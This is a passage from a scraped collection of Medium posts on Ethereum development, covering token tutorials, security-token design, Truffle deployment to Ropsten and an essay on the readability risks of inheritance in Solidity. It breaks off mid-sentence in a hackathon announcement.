Process", "post_link": "https://medium.com/@Codewars/latest-updates-new-language-announcements-and-updated-beta-process-a025dceed4eb?source=search_post", "author_name": "Codewars", "author_link": "https://medium.com/@Codewars", "publish_date": "2017-10-20", "last_modified_date": "2018-04-18", "readtime": "2.02", "claps": 65, "voters": 17, "content": "Latest Updates: New Language Announcements and Updated Beta ProcessCodewarsFollowOct 20, 2017 \u00b7 3 min readNew LanguagesFor about a month now we have been running some new languages in beta that we want to officially announce.SolidityFor those interesting in cryptocurrencies (and you should be, it\u2019s the future!) we have added Solidity to the platform. Solidity is a language used by Ethereum and other blockchains to develop smart contracts. If you don\u2019t know what smart contracts are, check them out \u2014 we think they are pretty great.There are already a few kata available, built just for Solidity, that will help you start to get your feet wet. Check these out:Smart Contracts Introduction: Gift CoinRock, Paper, Scissors, Smart Contractweb3 PackageSpeaking of Ethereum/cryptocurrencies, we have also updated our Node images to contain related packages. Here is a kata that demonstrates how to work with web3.ScalaScala is a JVM based language:Object-Oriented Meets Functional. Have the best of both worlds. Construct elegant class hierarchies for maximum code reuse and extensibility, implement their behavior using higher-order functions. Or anything in-between.A few kata have already been translated into Scala. Here is one to get you started.GroovyGroovy is a JVM based language:Groovy is a powerful, optionally typed and dynamic language, with static-typing and static compilation capabilities, for the Java platform aimed at improving developer productivity thanks to a concise, familiar and easy to learn syntax. It integrates smoothly with any Java program, and immediately delivers to your application powerful features, including scripting capabilities, Domain-Specific Language authoring, runtime and compile-time meta-programming and functional programming.A number of kata have also been translated into Groovy. Here is one of the easier ones.KotlinKotlin is another JVM language. It is commonly used for Android development.A statically typed programming language for modern multi-platform applications.There are already a Kotlin specific kata series out of beta to help get you started:Tricky Kotlin #0: extension constructorTricky Kotlin #1: invoke a stringTricky Kotlin #2: three fundamental functionsTricky Kotlin #3: define a functionA note about performance: All of the above languages are compiled and take a little time to run. Groovy will run the fastest, Scala the slowest. We have some infrastructure improvements in the works which will eventually speed things up.A Quick Beta Process UpdateBeta kata testers can no longer vote on a kata unless they have completed it. If you could not complete a kata due to a problem, please log a comment with the issue label.While we are on the subject. Logging issues on kata that have technical problems is the intended way of raising those issues. If you complete a kata, please vote on it based off of what you think its merit is, in terms of education or enjoyment. If you got value out of doing the kata, then say so \u2014 if you find the kata to have little to no value in completing, that\u2019s the intended case to mark it as unsatisfactory.Wiki DocsWe replaced our in-site documentation with Github wiki docs a while back, but in case anyone missed it \u2014 check them out here.", "responses": 0, "tags": ["Solidity", "Ethereum", "Kotlin", "Java", "Software Development"]}, {"title": "[ETHER101] Lession 3: Create a real Token in production with Ethereum", "post_link": "https://medium.com/@yenthanh/ether101-lession-3-create-a-real-token-in-production-with-ethereum-66f651091c3b?source=search_post", "author_name": "L\u00ea Y\u00ean Thanh", "author_link": "https://medium.com/@yenthanh", "publish_date": "2017-12-10", "last_modified_date": "2018-10-17", "readtime": "4.02", "claps": 258, "voters": 18, "content": "[ETHER101] Lession 3: Create a real Token in production with EthereumL\u00ea Y\u00ean ThanhFollowDec 10, 2017 \u00b7 5 min readIn the previous lession (https://medium.com/@yenthanh/ether101-lession-2-create-a-simple-token-cryptocurrency-with-ethereum-c6c21fde2ea2) we already know how to put the first step in programming with Ethereum and create for us a simple token which can\u2019t do much. In this lession, we will learn how to create a real token which can be used in real production.Let\u2019s create our new tokenExchanging value between our TOKEN and ETHERThe token we created in the previous lession doesn\u2019t have any value (unless someone accept to use the token for exchanging real thing), there are many ways to create value for your own token but it is about business problem. One of the simple way is to setup a relation between your token and a value that already has value \u2014 ETHER. So we will try to create a method which helps people exchange between our token and ETHER.Let\u2019s take a look at the below smart contract code:In this contract, we are having 2 new function: buy and sell . The buy function is a method to help people exchange from ETHER to your TOKEN, (i.e. buy your TOKEN using ETHER), and the sell function is vice versa.First let\u2019s start with the buy function, the function has a modifier functionnamed payable which helps people to know that they can use this function to send ETHER to your contract\u2019s address with the value stored in msg.value . Then we can define a value for own TOKEN = bitCoinPrice which is how much ETHER for 1 TOKEN. There is one important note: The value stored in msg.value is not ETHER but WEI \u2014 the smallest unit in Ethereum, 1 ETHER = 10\u00b9\u2078 WEI. That\u2019s why we need to define the value of our TOKEN bitCoinPrice in WEI unit. So in the above example code, we set 1 TOKEN = 1 ETHER. Then the following logic is just calculating the number of TOKEN and do the logic as the transfer function. Remember that this function send TOKEN from the contract to USER, so we need to make sure the contract has enough TOKEN to send to the buyer, the ETHER from the buyer is then belong to the contract.The sell function has the same logic but vice versa. We calculate how much ETHER must be sent to the seller and do the logic, we call function msg.sender.send to send ETHER. Remember that we need to make sure the contract has enough ETHER to send to the seller.This is just a simple demo how to define a value for our TOKEN. In the real product, the value of our TOKEN must be dynamic and being decided by voting methods or maybe some mystery financial system.Now, open ETHEREUM WALLET and deploy our contract, note that we need to send all TOKEN value from the creator to the contract first. After that we can use the buy and sell function to exchange between our TOKEN and ETHER.Manage events in the smartYou may see the above contract has defined a special event:event Transfer(address indexed from, address indexed to, uint256 value);This is a special event defined by Ethereum to help smart contracts notify about transfering events in Ethereum system. When ever a transfer event happen in our smart contract, we can call this event to notify Ethereum\u2019s people about it. (Line 16, 26 and 36)Inheritance in smart contractPeople call programming in Ethereum is COP (Contract \u2014 oriented programming), just like OOP (you know what it is). Logically, our Smart contracts can have some similar behaviours as Classes.Following the above example about creating a TOKEN which can be exchanged with ETHER. Now we are going to create a new contract with the same behaviour, but with a new function setPrices to setup new price for the TOKEN, of course we only allow a specific persion (address) to call it. So let\u2019s see how we can do that:First we create a contract named owned which some methods for managing ownership for our smart contract. You can see the modifier function onlyOwner .modifier onlyOwner {    require(msg.sender == owner);    _;}This is how we can create a modifier (such as payable modifier we used above). You may notice the line with _; . This is where the code of the function using this modified being inserted into. So you can see the onlyOwner modifier will insert require(msg.sender == owner) into our setPrices function, which only allow the owner can call this function.Now let\u2019s deploy the contract, use the owner address to change the prices and playing with other functions to understand more about it.ERC-20 TOKEN StandardAn ERC-20 TOKEN is a standard for all tokens implemented in Ethereum system, it has all the functions, properties which help Ethereum system can recognize the TOKEN and show it correctly to people. The ERC-20 TOKEN require below implementation:If you are creating your own TOKEN in real product, or using the TOKEN for ICO purpose, you need to implement it follow this standard. This is the minimum requirement to make people believe that the TOKEN has a real value (but not a scam).After that, you can create your own token, with your own functions and property. Bellow is an advanced implementation for a TOKEN with many functions. You may want to deploy it and play with it some more.Now you already know how to create a real token in Ethereum, let\u2019s create some interesting Token and use the power of Ethereum and Blockchain to make cool apps. In the next lessions, we will learn how to create own first ICO with the TOKEN we have created.Feel free to comment and discuss with me about Ethereum and Blockchain. Cheers!Some more interesting topics:Prevent Integer Overflow in Ethereum Smart ContractsHow to secure Sensitive data on an Ethereum Smart contract?List of MultiSig Wallet Smart contracts on EthereumToken Honey Pot Scam on Ethereum Network \u2014 When hacker scam hacker", "responses": 0, "tags": ["Ethereum", "Token", "Solidity", "Smart Contracts", "T7"]}, {"title": "Developer Updates and NPM Package", "post_link": "https://medium.com/ink-protocol/developer-updates-and-npm-package-3f57e272728e?source=search_post", "author_name": "Ink Protocol", "author_link": "https://medium.com/@PayWithInk", "publish_date": "2018-02-02", "last_modified_date": "2018-06-19", "readtime": "0.69", "claps": 202, "voters": 17, "content": "Developer Updates and NPM PackageInk ProtocolFollowFeb 2, 2018 \u00b7 1 min readHi everyone! The tech team has been hard at work, and we wanted to send out a few quick updates for everyone interested in developing marketplaces, apps or services using Ink Protocol.NPM PackageWe recently released our NPM package, which makes it easy to start working with our smart contract. We use this package internally for our Listia integration as well. Check it out!ink-protocolDecentralized reputation and payments for peer-to-peer marketplaceswww.npmjs.comTo install, just typenpm install ink-protocolLatest Smart ContractOur Ink Protocol contract has undergone a few changes, and the latest one is available on Testnet using the link below. As always, do reach out directly if you want help using it or building on top of it. We will be deploying the Mainnet version soon, so stay tuned!Ethereum Account 0xB03b5ad79e59dc60974021059C85D3BC397C8EDa InfoContract Source Code Copy Find Similiar Contracts pragma solidity ^0.4.18; // File: contracts/InkMediator.sol interface\u2026rinkeby.etherscan.ioFull Source CodeAll of our Ink Protocol related source code and docs are available on Github.InkProtocol/contractscontracts - The Ink Protocol Ethereum Smart Contractgithub.com", "responses": 0, "tags": ["Ethereum", "NPM", "Blockchain", "Smart Contracts", "Solidity"]}, {"title": "Security token code and the future of R-token", "post_link": "https://medium.com/hackernoon/security-token-code-and-the-future-of-r-token-a7c70b50421a?source=search_post", "author_name": "Andy Singleton", "author_link": "https://medium.com/@andysingleton", "publish_date": "2018-09-05", "last_modified_date": "2018-10-22", "readtime": "6.87", "claps": 104, "voters": 16, "content": "Security token code and the future of R-tokenAndy SingletonFollowSep 5, 2018 \u00b7 7 min readIf you want to issue a tokenized or \u201cprogrammable\u201d security, you will need some code to program. There are an increasing number of ERC20 token formats to handle securities, including ST20 from Polymath, R-token from Harbor, and DS from Securitize.io. I have heard rumors that Tokensoft and New Alchemy are preparing their own token formats. I suspect they are adding to the noise because it is hard to find code that is truly open source and useful for advisors and issuers that want to design tokenized securities. Each vendor is trying to build its own walled garden, not a globally unified security market. It\u2019s time to start consolidating the formats, and opening up participation. In this article, we will cover the basic requirements for a security token. We will also describe our own work to improve R-token, open it up, merge it with ST20, and connect it to DS.Harbor introduced their idea for a simple and upgradeable whitelist token last January as \u201cR-token\u201d. We adopted it and we have built it into a sophisticated machine. However, Harbor appears to have abandoned it. Their last code update was on April 5, and they have not responded to calls or emails during the past few months.We have filled out R-token and proposed some simplifications and improvements, and added those capabilities to ST20. The next step is to merge that work with other formats to make a more standard and more open foundation.Security tokens have unique requirementsA security token has basic requirements that are different from the requirements of a cryptocurrency.Whitelisting of qualified investorsAll of the tokens that I describe here can do whitelisting, which means that they keep a list of blockchain addresses that represent investors that are qualified to receive a security. Then, they prevent the transfer of the token to anyone that is not on the list.The most basic investor qualification function is KYC/AML. In the regulated world, almost every investor needs to be qualified with KYC/AML before you send them a security. \u201cKnow Your Customer\u201d means that you know who the investor is, and it\u2019s not a bad guy, a tax evader, or someone under political sanctions. \u201cAnti Money Laundering\u201d means that you know approximately where they got the money to buy a security, and it\u2019s not from illegal activity. You can put people on a whitelist after you make these checks.In the US and many other jurisdictions, investors need an additional level of qualification before you can sell them private securities. Private securities are any securities without public market reporting, which is expensive. Governments allow you to sell to investors without the expensive public market reports and disclosure, but they often only allow you to sell to investors that are \u201csophisticated\u201d or \u201cprofessional\u201d enough to do their own analysis and cover their own losses. In the US they can meet qualifications like accredited (they have $1M to invest), Qualified ($5M) or QIB ($100M).A lot of securities won\u2019t need \u201csophisticated\u201d investor qualification, but they will almost all need KYC/AML qualification. The US government has been an enthusiastic promoter of KYC/AML rules, and through their control of the dollar-based money transfer system, they have been able to push for KYC/AML rules in almost every jurisdiction.It\u2019s possible to make sure that your buyers have been qualified if you only sell through centralized exchanges that check their qualifications. That\u2019s how the current public exchange system works. However, this doesn\u2019t actually cover the use case for tokenized securities, which are also sold directly by the issuer, in portals, exchanged peer to peer or \u201cOTC\u201d, and moved between exchanges. To get that type of mobility, you need a whitelist, and you need to be able to add qualified exchange customers to the whitelist when you transfer a security out of an exchange. So, whitelist token formats are important even to exchanges with good internal transfer agents.Transfer rulesIf you are selling a private security, you will need to enforce transfer rules so that you send only to qualified investors, according to the different rules of various jurisdictions. You probably also want to enforce lockups, such as the one year lockup for private securities sold in the US. You may have other rules that are typically part of a \u201csubscription agreement\u201d signed by a shareholder. One of the benefits of a tokenized security is that we don\u2019t have to pass around paper and sign subscription agreements. Instead, we program the rules directly into the security. Then we can exchange.Transfer rules will almost always be required because the majority of security tokens are private securities, or they are private SOMEWHERE in the world where they have investors. Securities that qualify as a public security in Malta or the UK will usually need to be handled as private securities in the US. Keeping track of these rules will prevent you from getting a call from a regulator you don\u2019t want to deal with.The tokens mentioned in this article are all programmed to run on Ethereum. However, we can use the same rules and whitelists for other chains and ledgers that are faster or simpler. For example, Stellar does not allow tokens to carry their own code. However, they are adding a feature which can require that an issuer sign off on every transfer using a type of centralized oracle. We can use the same whitelists and rules to do that.Security replacement and other governanceWith a cryptocurrency, if you lose the key, you lose the asset. Securities don\u2019t work that way. If grandma buys a security, and dies without leaving a key, you still owe the securities to her estate. As the issuer, you need a way to essentially replace the share certificate by grabbing the old tokens and moving them to a new holder. There are other cases where you may need to force a transfer, such as the case where 90% of investors have accepted a tender offer, and you have the right to force the other 10% into the deal.To do this, you need a governance process, such as the multi-sig governance that we have programmed into our registry. You probably need a workflow for issuing more securities, which companies do all of the time after board approval, and for distributing securities or payments.Real name registryIf you are selling stock, then you are required to keep a list of shareholders. You need to be able to track them down to verify regulatory compliance, and you need to be able to contact them so you can provide them with their shareholder rights. Essentially, you need to be able to go back to the party that qualified an investor and put them on the whitelist, and get more information for your registry. Our token implementations include a whitelisting system and registry to do this.UpgradesDuring the multi-year life of a security, the rules change. The sets of qualified investors change. You may want to provide new features for compatibility with emerging exchanges. You may want to fix your implementation. It\u2019s very important to be able to attach updated code to your existing token.A lot of the token code that we looked at fails to meet the requirement for upgradeability.R-Token upgradesThe original R-token concept was very simple. R-Token is a permissioned token on the Ethereum blockchain, enabling token transfers to occur if and only if they are approved by an on-chain Regulator Service (a script). The ServiceRegistry is a mechanism to upgrade the regulator as rules change over time. We liked the upgrade feature.Original R-Token format with Service RegistryWe have made a number of modifications to make it easier to upgrade the rules, settings, and whitelists:Revised R-Token with reusable whitelistsService Registry is unnecessary component that costs additional fees. The pointer to the current Regulator can be updated in token itself.Settings Storage holds values for managing token transfers like transfer lockup, allow new shareholders, initial offering end date or managing whitelists. It is also replaceable. You can update these settings independent from updating the code.We filled in the rules for a US Reg D and global Reg S offering, and various other private market rules.We added reusable whitelists, which can be used with other token formats.Other token formatsYou can add these scripts to an ST20 token by replacing the \u201cTransfer Manager\u201d. This will upgrade the ST20 token that Polymath is currently generating to include upgraded whitelists and rules. It is a big improvement from the very crude whitelist in their initial release. It will also add the registry capabilities.I think that Polymath has done a pretty good job in offering their ST20 format as a standard that issuers and exchanges can build on. That is what we are doing here. However, much of their effort is going into the Polymath \u201cplatform\u201d, which is a portal and a more complicated set of code that manages the process of an initial sale, and encourages you to use their POLY token. Engaging with this platform is difficult, and most people will skip it. Most advisors have their own sales channel. The POLY tokens are annoying. Polymath doesn\u2019t return messages or have an established path for code contribution or plugin contribution. I find this to be true even though I have a partnership agreement with them. I look forward to working with them on a more open plugin process.Securitize.io is currently rolling out tokens with their new DS format, whitelists, and registry. Unfortunately, this is currently a closed system that requires you to buy all of the token programming from Securitize, and qualify investors through their portal. The DS architecture is pretty similar to our implementation. I offered my code to them, but they decided to roll their own. We can unify these efforts for exchanges by making a code- compatible API for the registry.I have sent messages to Tokensoft and New Alchemy, and not heard back.Developing a global marketLet us know how we can share code or accept contributions. Let us know how we can include your whitelists and customer lists. We can all be engaged in helping issuers and exchanges ramp up a truly global security market.", "responses": 4, "tags": ["Blockchain", "Tokenization", "Solidity", "Stock Market", "Security Token Code"]}, {"title": "Ethereum \u00d0Apps Programming Distilled \u2014 Part 5", "post_link": "https://medium.com/@mbellinaso/ethereum-dapps-programming-distilled-publishing-ropsten-testnet-mainnet-infura-f5b391c80e60?source=search_post", "author_name": "Marco Bellinaso", "author_link": "https://medium.com/@mbellinaso", "publish_date": "2018-03-06", "last_modified_date": "2018-05-02", "readtime": "7.68", "claps": 55, "voters": 17, "content": "Ethereum \u00d0Apps Programming Distilled \u2014 Part 5Publishing a DApp: using Truffle to deploy on either the Ropsten testnet or on the mainnet, and deploying the frontend on GitHub Pages with CloudFront on top.Marco BellinasoFollowMar 6, 2018 \u00b7 8 min readThis is a multi-part article. Here are the links to the other parts:Part 1: What is a blockchain and how does it work?Part 2: What\u2019s special about Ethereum, and how to write a Smart Contract with Solidity?Part 3: Deploying the backend of a DApp: Geth, Mist and TrufflePart 4: Creating and deploying the frontend with HTML, JS, Web3 and MetaMaskSo far we\u2019ve worked with a local private blockchain, and a frontend running on a local webserver. Let\u2019s see what it takes to publish it \u201clive\u201d, so that it\u2019s usable by other people.BackendPublishing a Smart Contract to a public blockchain is the same regardless of whether it\u2019s a testnet (I used Ropsten) or mainnet (besides the price of course \u2014 it\u2019s free on testnet, it\u2019s not free on mainnet). The \u201cpure\u201d approach would be to use the geth client to download the entire blockchain on your machine, then deploy to it (using geth, Mist or Truffle) and have the transaction broadcasted from your machine to the closest nodes and then to the entire network. I gave it a try but, honestly, I failed: geth kept finding only 1 or 2 nodes to downloaded data from, they dropped very often, and for that reason or unknown others geth was always getting stuck indefinitely. After a Saturday of attempts I gave up and looked at alternatives.Turns out there is a very easy one, which is sending the transactions to the public nodes hosted by Infura.io rather than using a local node! Just sign up on their website for free and you\u2019ll be given the url of a node that you can use rather than using localhost. You save time and plenty of space on your hdd. Once you have that, install the truffle-hdwallet-provider library on your machine, and finally edit the truffle.js file as follows to configure the Ropsten network (see here for a full step-by-step guide):var HDWalletProvider = require(\"truffle-hdwallet-provider\");var Web3 = require(\"web3\");var web3 = new Web3();var mnemonicRopsten = \"...find these on the MetaMask popup...\";module.exports = {  networks: {   development: {      host: \"localhost\",      port: 9545,      network_id: \"*\" // Match any network id    },    ropsten: {      provider: function() {        return new HDWalletProvider(mnemonicRopsten,            \"https://ropsten.infura.io/[your token here]\")      },      network_id: 3,      gas: 4600000,      gasPrice: web3.toWei(\"20\", \"gwei\")    }     }};Now execute \u201ctruffle migrate \u2014 network ropsten\u201d from the command-line, and that will hopefully deploy your contract on the Ropsten testnet, giving you a feedback similar to the following:Using network 'ropsten'.Running migration: 1_initial_migration.js  Deploying Migrations...  ... 0x6cd4f49d0c04a3d976c63d04c766ba50f9813a5cd72265e4a4adf527d04d4791  Migrations: 0x7076dff8039206819f0c0ab7158457e8ee615ae5Saving successful migration to network...  ... 0xa8eb0ac1f5967338744a491eb74d20fbc652e49b112b30c66a48b43462ca0778Saving artifacts...Running migration: 2_deploy_contracts.js  Deploying MessageStorage...  ... 0x338eecf2260437d7aa45dc348dc8e675aea1d132ba18c94af0a2fa34bc34f766  MessageStorage: 0x765c19b73379dec5d851f66d937e053c865f9960Saving successful migration to network...  ... 0xda762551e6931e1d34e85418d3b467da4aa22501875ec3302a6d6e2aad680decSaving artifacts...The address in bold is the transaction that actually deployed the contract on the Ropsten testnet, which you can search on ropsten.etherscan.io to see all details about it. For example it\u2019s very interesting to see that the transaction costed 0.03454534 ETH\u2026which is 0 USD on the testnet, but would have been around 30$ on the mainnet, at the current valuation of 1ETH=865USD. That is for a contract of around 200 lines + 800 lines for helper libraries; the cost would of course go up according to how big your contract and dependencies are! That is one of the reasons why you\u2019ll really want to deploy when you\u2019re confident that everything is ok, there are no bugs, etc.Note: if you get \u201cout of gas\u201d errors when trying to run the migration, check from MetaMask that the first account in the Ropsten network has some Ether (HDWalletProvider uses the first one, you can\u2019t make it use a different one). If you need some, just click \u201cBuy\u201d from MetaMask and it will send you to a webpage where you can get some from a free \u201cfaucet\u201d.As said, publishing to the mainnet would follow the same approach: you\u2019d just use a different url from Infura for the truffle.js file, and you\u2019d need some real Ether in your account.FrontendRunning Truffle to deploy on the public blockchain does of course create a new ABI file (eg. ../build/contracts/MessageStorage.json), with the address of where the contract is available on that network. Just include that file in your project, by replacing the one used during development that was pointing to the private chain, and you\u2019re done. You can test the frontend on the same http://localhost:3000 url that you\u2019ve used before, to ensure everything is still ok, and then finally move it all online on an externally-reachable webserver.That only thing I had to fix was about showing a \u201cloading overlay\u201d after sending a transaction to create a message, and hiding it when that completed. Transactions sent to the private blockchain are instantaneous so I hadn\u2019t noticed I needed that. Transacting on Ropsten has instead a latency of quite a few seconds, which makes it necessary to show some feedback to the user in the meantime. This is why a real decentralised testnet is much more realistic than a completely private setup.Since my app\u2019s frontend is just static html and js files, I didn\u2019t need a hosting that supports Node.js, PHP, ASP.NET or any other server-side framework. Therefore, the free GitHub Pages is perfectly capable of hosting my frontend. The nice thing about this option (besides the price being zero) is that to publish a new version of the files you just do a git commit/push.If you deploy the contract only on the mainnet, or maybe only on the Ropsten testnet while it\u2019s in beta, you\u2019ll want to write a few lines of javascript to check that the user is on the correct network, otherwise the page wouldn\u2019t work because the contract wouldn\u2019t be found. Here\u2019s a snippet that logs the current network and displays an error if the user is not on Ropsten:web3.version.getNetwork((err, netId) => {  switch (netId) {    case '1':      console.log('This is mainnet');      break;    case '2':      console.log('This is the deprecated Morden test network.');      break;    case '3':      console.log('This is the ropsten test network.');      break;    default:      console.log('This is an unknown/private network.');  }  if (netId != '3') {    alert('You must be on the Ropsten testnet!');  }});I put CloudFlare in front of my files on GitHub Pages, as explained here very clearly by Karan Thakkar, to have free SSL, url rewrites (eg: remove www. from www.msgblocks.com/something), CDN caching and html/css/js minification (in case you don\u2019t do it as part of your build process). In order to have your own domain, just purchase it on Namecheap or from somewhere else, make it point to the CloudFlare\u2019s nameservers, let CloudFlare automatically set up the DNS records you need, and do the other few steps explained in the article above to configure redirects and https. It takes like 10 minutes to set up and it\u2019s free\u2026can\u2019t really ask for more!Your app would now be public, running on a real decentralised blockchain with a web frontend on your own domain, with a CDN (content delivery network) to speed up the page load and protected by SSL.Sounds good\u2026how do I start my app now?This is what I\u2019d do if I had to start from scratch now:Read this article about creating, deploying and debugging a Smart Contract with Truffle. You can set up the environment and follow the guide step by step in one hour or so. The sample contract is of course super simple, but it shows plenty of concepts in practice, and it\u2019s very beneficial.Install the Ganache GUI to have a nicer and easier way to see what happens on your private blockchain as you keep doing sample transactions with the contract developed in #1.Read this other article, also by ConsenSys (like everything about Truffle), about creating a more complex Smart Contract but also its web-based frontend with HTML, JS, MetaMask.Do the interactive CryptoZombies course, created by Matthew Campbell and the Loom Network team. This is really an incredible tool to start from zero with Solidity, and learn how to create a game similar to the popular CryptoKitties step-by-step, with plenty of useful notes and tips along the way. Complete all the lessons and really write the code in their editor, it\u2019s very worth it!At this point you should know more than enough to start your own original idea! Enjoy!ConclusionsWhile it\u2019s no longer early days to become a cryptocurrency investor\u2026it\u2019s definitely very early days to be a blockchain developer and create something new and interesting. If you start now \u2014 and even if you only play with simple things \u2014 you\u2019ll have an advantage in the future when the technology becomes more mature and there will be frameworks and tools that abstract complexities and provide workarounds for the current constraints, because you\u2019ll have a better understanding of how things work behind the scenes.Starting out is not difficult, and it\u2019s something that\u2019s probably quite different from everything that you\u2019ve worked on so far, which should make it fun and interesting\u2026so why not?Other ResourcesIn addition to all the resources and articles linked above, here are some more resources that I suggest to check out:How does Ethereum work, anyway? by Preethi Kasireddy, gives a deeper and more visual overview of many concepts of how this blockchain works under the hood.Ethereum Smart Contract Development Best Practices: the title says it all.ETH Guide by chris dannen provides plenty of links to tools, articles and various other resources, grouped by category.Token Economy is a weekly newsletter written by Stefano Bernardi and Yannick Roux that covers more the financial side of things (new projects, market analysis, rumours, technology improvements in the different blockchains, \u2026), but it\u2019s a great resource to see what\u2019s happening in the crypto world as a whole. There\u2019s even too much to follow unless this becomes your priority, but the good thing is that for every article they link they provide a summary and commentary directly in the newsletter\u2026so even reading just that might be enough to get a high-level understanding of what\u2019s new.Getting Up to Speed on Ethereum by Matt Condon: it talks about some of the things explain in this article as well, plus it gives a quick overview of many other technologies in the ecosystem, such as tokens, ETHPM, the different programming languages (even if you can care about just Solidity at the moment), DAOs, Aragon, IPFS, FileCoin, Augur, Gnosis, Golem, 0xProject, Bancor, Oraclize, BTCRelay, Open Zeppelin, ENS, \u2026 (yes, I agree, there are too many things to study! :)Who am I / what do I do? I proudly work as a Solutions Architect in the Mobile Team @ ASOS.com (iOS app | Android app), and we\u2019re always looking for strong, friendly and talented developers that want to have an impact on how tens of millions of customers shop online. ASOS is the biggest online-only retailer in UK and, let\u2019s be real, the best tech+fashion company in the world. Some of the technologies we use are Swift for iOS, Kotlin for Android, React and Node on the web frontend, .NET and Azure on the backend. If that sounds interesting to you, and you happen to live in beautiful London (or are willing to move here\u2026after all it\u2019s the best city in Europe except for some in Italy!), do get in touch with me!", "responses": 1, "tags": ["Ethereum", "Dapps", "Solidity", "Blockchain", "Blockchain Development"]}, {"title": "A Case Against Inheritance in Smart Contracts", "post_link": "https://medium.com/consensys-diligence/a-case-against-inheritance-in-smart-contracts-d7f2c738f78e?source=search_post", "author_name": "Steve Marx", "author_link": "https://medium.com/@smarx", "publish_date": "2019-07-01", "last_modified_date": "2019-07-02", "readtime": "4.12", "claps": 195, "voters": 18, "content": "A Case Against Inheritance in Smart ContractsSteve MarxFollowJul 1 \u00b7 5 min readPhoto by Matteo Grando on UnsplashIn this article, I\u2019ll attempt to persuade you to reduce your use of inheritance in smart contracts and to increase your skepticism when you see it.The position that inheritance is to be avoided is, at least to some extent, one of personal preference. I won\u2019t attempt to prove to you that inheritance is bad, but I will show you two examples that will hopefully nudge you in that direction.Clarity is paramountPrograms must be written for people to read, and only incidentally for machines to execute.\u2013 Harold Abelson, Structure and Interpretation of Computer ProgramsThis quote from 1984 long predates the blockchain, but it\u2019s especially true when it comes to smart contracts. Smart contracts make it possible for people to engage in all sorts of transactions without having to trust one another. Trust between participants is replaced by trust that the smart contract does what it\u2019s supposed to.In Upgradeability Is a Bug, I argued that it\u2019s impossible to trust a mutable smart contract because what it does may change. Similarly, it\u2019s impossible to trust an inscrutable smart contract because what it does is too hard to determine in the first place.Inheritance is one way to make smart contracts harder to understand. This is a problem for people who read the code and for the developers who need to maintain it.Inheritance is hard for readersThis short example relies heavily on inheritance. See if you can spot the vulnerability:After calling disableAdmin, no one should be able to call kill successfully, but it turns out they can. This vulnerability could be an innocent mistake, but it\u2019s more likely intentional deception by the author, who can now run off with everyone\u2019s ether.The problem relates to multiple inheritance. Bank inherits from both TempAdmin and MultiAdmin. When the kill function calls isAdmin, which contract\u2019s version of that function is executed? When that contract subsequently calls super.isAdmin, what happens?The Solidity compiler uses an algorithm called C3 linearization to answer these questions. In this specific example, the code is executed in this order:kill \u2192 MultiAdmin.isAdmin \u2192 TempAdmin.isAdmin \u2192 Admin.isAdminThis is a bad order, leading to checking the equivalent of this:What we would prefer, and what happens if you write is MultiAdmin, TempAdmin (swapping the two base classes), is this order:kill \u2192 TempAdmin.isAdmin \u2192 MultiAdmin.isAdmin \u2192 Admin.isAdminThis results in correct code that checks the equivalent of this:This example was heavily inspired by Phil Daian\u2019s entry in the 1st Underhanded Solidity Coding Contest. If you\u2019d like a deeper understanding of the issue and a more devious smart contract example, I encourage you to read his writeup and code in full.Inheritance is hard for developersConsider the following contract, which implements a marketplace for ERC721 non-fungible tokens:This marketplace is perfectly functional, but perhaps the NFT market is volatile, and users would like the ability to set expiration dates on their listings. The following contract inherits from NFTMarket and adds expiration dates:I couldn\u2019t modify the original contract\u2019s Listing struct, so I\u2019ve added a new array to keep track of expirations. I had to override all the functions, and readers have to jump back and forth between the base class and the derived class to understand what\u2019s happening.Did you spot the bug? I completely missed it in the first draft of this article, and inheritance is all I was thinking about! Because my new list function takes an extra parameter, it\u2019s not actually overriding the original. I need this too:Without this override, callers will still be able to invoke the base contract\u2019s list function, and the listing array will get out of sync with the expirations array. (Exactly what would happen is left as an exercise to the reader, but suffice it to say that the contract would be thoroughly broken.)The derived contract is hard to read and hard to maintain. Depending on how you format the code, the new contract increases our total line count by about 75%.Copy/paste/modify is betterNow I\u2019ll take a different approach. Instead of inheriting from NFTMarket, I\u2019ll copy/paste the code and directly modify it. In the below code, I\u2019ve annotated every change I made with a comment that reads \u201cADDED\u201d:This time, it took only four lines of code to add the needed functionality! The result is much easier to read and was trivial to get right on the first try. When I add new functions in the future, it will be straightforward to take expirations into account.Should you use inheritance at all?Vyper, an Ethereum smart contract language that aims to fix some of Solidity\u2019s shortcomings, does away with inheritance altogether:Class inheritance \u2014 requires people to jump between multiple files to understand what a program is doing, and requires people to understand the rules of precedence in case of conflicts (which class\u2019 function X is the one that\u2019s actually used?). Hence, it makes the code too complicated to understand.I\u2019d love to tell everyone to just never use inheritance, but here are a few arguments in favor of it:Using inheritance in conjunction with private functions can actually simplify things. A derived class can\u2019t call its parents\u2019 private functions directly, so there\u2019s a little less surface area to consider.Inheritance may make it easier to maintain multiple versions of a contract that support different use cases. OpenZeppelin is an example of a library that uses inheritance in this way. Arguably, inheritance makes these contracts harder to read, but it makes it easier for the developers to maintain lots of variants.If you want to reuse someone else\u2019s code, inheritance may be the cleanest way to do that. Deriving from a contract, especially a popular one like OpenZeppelin\u2019s Ownable contract, may actually make it easier for a reader to understand your code. This is especially true if you don\u2019t override any of the base contract\u2019s functions. Copy/pasting would make it harder for readers to determine whether you made any modifications.Bottom lineI encourage you to think of inheritance like inline assembly: there are situations that call for its use, but it should be avoided when possible because it hurts readability and maintainability.", "responses": 1, "tags": ["Ethereum", "Blockchain", "Solidity", "Smart Contracts", "Smart Contract Security"]}, {"title": "Global Virtual Blockchain Hackathon: Challenge From BANKEX Foundation", "post_link": "https://blog.bankex.org/global-virtual-blockchain-hackathon-challenge-from-bankex-foundation-dc8c7fa4c5d5?source=search_post", "author_name": "BANKEX", "author_link": "https://blog.bankex.org/@bankexcom", "publish_date": "2018-07-05", "last_modified_date": "2018-07-05", "readtime": "2.69", "claps": 739, "voters": 16, "content": "Global Virtual Blockchain Hackathon: Challenge From BANKEX FoundationBANKEXFollowJul 5, 2018 \u00b7 3 min readBANKEX Foundation has created a challenge as a part of Hack.Summit(\u201cBlockchain\u201d) \u2014 a global, virtual hackathon hosted by Deconetand Hack VC that will take place from July 6th-8th, 2018.ChallengeCheck out BANKEX Foundation\u2019s full challenge description here (create an account in Deconet to view it). Additional resources and judging criteria are also provided.BANKEX Foundation has created 4 product challenges for hackathon participants, but they welcome you to create a different solution based on their technology and will value it just the same and reward accordingly.#1 web3swift based projects \u2014 5000 BKXLately, blockchain technology is quickly gaining positions in the mobile devices market. This challenge dares you to create an innovative solution with the help of the fastest and the most popular native mobile library that works with 